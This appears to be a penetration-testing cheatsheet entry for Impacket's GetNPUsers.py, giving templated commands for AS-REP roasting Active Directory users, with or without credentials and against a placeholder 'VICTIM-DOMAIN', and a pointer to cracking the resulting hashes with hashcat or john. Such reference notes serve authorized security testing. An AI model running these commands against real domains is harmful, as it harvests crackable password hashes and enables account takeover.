---
id: 93c4ecd9-c2cd-4321-8789-26c4626cebd1
name: getnpusers.py
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:45.439671+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# getnpusers.py



**Command** ([[check ASREPRoast for all domain users (credentials required)]]):

```bash
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

```







**Command** ([[check ASREPRoast for a list of users (no credentials required)]]):

```bash
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

```







**Command** ([[check kerberoast]]):

```bash
python GetNPUsers.py VICTIM-DOMAIN/ -usersfile user.txt -dc-ip <IP> -format hashcat

```





# crack as_rep_response_file

search for hashcat / john


